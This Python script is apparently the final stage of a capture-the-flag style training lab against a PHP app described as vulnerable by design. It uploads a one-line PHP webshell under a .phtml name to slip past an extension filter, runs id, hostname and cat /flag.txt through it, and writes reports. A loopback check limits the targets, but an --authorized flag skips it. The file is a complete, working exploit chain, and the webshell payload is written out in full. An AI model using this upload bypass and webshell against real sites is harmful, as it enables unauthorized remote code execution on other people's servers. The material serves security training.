#!/usr/bin/env python3
"""Fase final del lab: RCE contra la app PHP vulnerable por diseno.

Cadena:
  1. subida de un archivo .phtml (la app solo bloquea .php exacto)
  2. ejecucion del webshell en /uploads/
  3. comandos de verificacion: id, hostname y cat /flag.txt

Esto NO explota CVE-2026-109618/619. El target (`php:8.5.11-apache`) es una
aplicacion de entrenamiento creada para este lab y vulnerable a proposito.

Uso:
    python3 lab/rce.py --url http://127.0.0.1:8082/
    python3 lab/rce.py --url http://127.0.0.1:8082/ --json
"""
from __future__ import annotations

import argparse
import http.client
import ipaddress
import json
import secrets
import socket
import sys
import urllib.parse
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

ROOT = Path(__file__).resolve().parent.parent
REPORTS = Path(__file__).resolve().parent / "reports"
EXPECTED_FLAG_FILE = ROOT / "target" / "flag.txt"
BOUNDARY = "----rtRceBoundary"
LOOPBACK_NAMES = {"localhost", "localhost.localdomain"}


def is_loopback(host: str) -> bool:
    if host.lower() in LOOPBACK_NAMES:
        return True
    try:
        infos = socket.getaddrinfo(host, None)
    except socket.gaierror:
        return False
    for info in infos:
        raw = info[4][0].split("%", 1)[0]
        try:
            if not ipaddress.ip_address(raw).is_loopback:
                return False
        except ValueError:
            return False
    return bool(infos)


def parse_target(url: str) -> dict[str, Any]:
    u = urllib.parse.urlsplit(url)
    if u.scheme not in ("http", "https"):
        raise SystemExit("URL no soportada: usa http:// o https://")
    return {
        "url": url,
        "scheme": u.scheme,
        "host": u.hostname or "127.0.0.1",
        "port": u.port or (443 if u.scheme == "https" else 80),
        "path": u.path or "/",
    }


def request(
    target: dict[str, Any],
    method: str,
    path: str,
    body: bytes | None = None,
    headers: dict[str, str] | None = None,
    timeout: float = 15.0,
) -> dict[str, Any]:
    cls = http.client.HTTPSConnection if target["scheme"] == "https" else http.client.HTTPConnection
    conn = cls(target["host"], target["port"], timeout=timeout)
    try:
        conn.request(method, path, body=body, headers=headers or {})
        resp = conn.getresponse()
        data = resp.read(65536)
        return {
            "ok": True,
            "status": resp.status,
            "reason": resp.reason,
            "body": data.decode("utf-8", "replace"),
        }
    except Exception as exc:
        return {"ok": False, "error": f"{type(exc).__name__}: {exc}"}
    finally:
        conn.close()


def build_upload(filename: str, payload: bytes) -> tuple[bytes, dict[str, str]]:
    body = (
        b"--" + BOUNDARY.encode() + b"\r\n"
        + f'Content-Disposition: form-data; name="avatar"; filename="{filename}"\r\n'.encode()
        + b"Content-Type: application/octet-stream\r\n\r\n"
        + payload + b"\r\n"
        + b"--" + BOUNDARY.encode() + b"--\r\n"
    )
    headers = {
        "Content-Type": f"multipart/form-data; boundary={BOUNDARY}",
        "Content-Length": str(len(body)),
        "Connection": "close",
        "User-Agent": "php2shell-rce-lab/1.0",
    }
    return body, headers


def run_command(target: dict[str, Any], shell_url: str, cmd: str) -> dict[str, Any]:
    path = shell_url + "?cmd=" + urllib.parse.quote(cmd)
    r = request(target, "GET", path, timeout=15)
    body = r.get("body", "")
    marker = "RT:"
    output = body.split(marker, 1)[1].strip() if marker in body else ""
    return {"cmd": cmd, "status": r.get("status"), "output": output, "ok": r.get("ok") and marker in body}


def write_report(report: dict[str, Any]) -> tuple[Path, Path]:
    REPORTS.mkdir(parents=True, exist_ok=True)
    ts = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    jpath = REPORTS / f"rce-{ts}.json"
    mpath = REPORTS / f"rce-{ts}.md"
    jpath.write_text(json.dumps(report, indent=2, ensure_ascii=False) + "\n", encoding="utf-8")

    up = report["upload"]
    rce = report["rce"]
    rows = "\n".join(
        f"| `{c['cmd']}` | {c['status']} | `{c['output'][:200]}` |"
        for c in rce["commands"]
    )
    flag_line = (
        f"**Flag capturada:** `{rce['flag_found']}`"
        if rce["flag_ok"]
        else f"**Flag no valida.** Esperada: `{rce['flag_expected']}` / obtenida: `{rce['flag_found'] or '(vacia)'}`"
    )
    mpath.write_text(
        f"""# RCE - app de entrenamiento PHP2Shell

- **Fecha (UTC):** {report["timestamp"]}
- **Target:** `{report["target"]["url"]}`
- **Aviso:** app vulnerable por diseno; no es un exploit del CVE de memoria.

## 1. Subida del webshell

- Archivo: `{up["filename"]}`
- HTTP: `{up["status"]}`
- Subida correcta: `{up["ok"]}`

## 2. Ejecucion remota

- Webshell: `{rce["webshell_url"]}`

| Comando | HTTP | Salida |
|---|---|---|
{rows}

{flag_line}

## 3. Conclusion

{rce["conclusion"]}

---
_Generado por `lab/rce.py`._
""",
        encoding="utf-8",
    )
    return jpath, mpath


def main(argv: list[str] | None = None) -> int:
    p = argparse.ArgumentParser(description="RCE contra la app PHP vulnerable del lab")
    p.add_argument("--url", default="http://127.0.0.1:8082/")
    p.add_argument("--authorized", action="store_true")
    p.add_argument("--expected-flag", default=None)
    p.add_argument("--json", action="store_true")
    args = p.parse_args(argv)

    target = parse_target(args.url)
    if not is_loopback(target["host"]) and not args.authorized:
        raise SystemExit("[!] Target no loopback. Este lab solo opera en 127.0.0.0/8 o ::1.")

    expected = args.expected_flag
    if expected is None and EXPECTED_FLAG_FILE.is_file():
        expected = EXPECTED_FLAG_FILE.read_text(encoding="utf-8").strip()

    token = secrets.token_hex(4)
    filename = f"rt_{token}.phtml"
    payload = b'<?php echo "RT:"; echo shell_exec($_GET["cmd"] ?? "id"); ?>'
    body, headers = build_upload(filename, payload)

    up = request(target, "POST", target["path"].rstrip("/") + "/upload.php", body=body, headers=headers)
    upload_ok = bool(up.get("ok") and up.get("status") == 200 and filename in (up.get("body") or ""))
    shell_url = target["url"].rstrip("/") + "/uploads/" + filename

    commands: list[dict[str, Any]] = []
    if upload_ok:
        for cmd in ("id", "hostname", "cat /flag.txt"):
            commands.append(run_command(target, shell_url, cmd))

    flag_out = next((c["output"] for c in commands if c["cmd"] == "cat /flag.txt"), "")
    flag_ok = bool(expected and flag_out.strip() == expected.strip())
    rce_ok = upload_ok and any(c["ok"] for c in commands)

    report = {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "target": target,
        "disclaimer": "Target de entrenamiento vulnerable por diseno; no es un exploit de CVE-2026-109618/619.",
        "upload": {"filename": filename, "status": up.get("status"), "ok": upload_ok},
        "rce": {
            "webshell_url": shell_url,
            "commands": commands,
            "flag_expected": expected,
            "flag_found": flag_out.strip(),
            "flag_ok": flag_ok,
            "conclusion": (
                "RCE confirmado y flag leida." if flag_ok
                else "RCE confirmado, pero la flag no coincide." if rce_ok
                else "No se pudo confirmar RCE."
            ),
        },
    }

    jpath, mpath = write_report(report)

    if args.json:
        print(json.dumps(report, indent=2, ensure_ascii=False))
    else:
        print(f"[i] target: {args.url}")
        print(f"[1] upload  : {filename} -> HTTP {up.get('status')} ok={upload_ok}")
        for c in commands:
            print(f"[2] rce     : ${c['cmd']} -> {c['output'][:120]!r}")
        print(f"[3] flag    : {'OK ' + flag_out.strip() if flag_ok else 'NO'}")
        print(f"[4] informe : {mpath}")
        print(f"             {jpath}")

    return 0 if flag_ok else 1


if __name__ == "__main__":
    raise SystemExit(main())
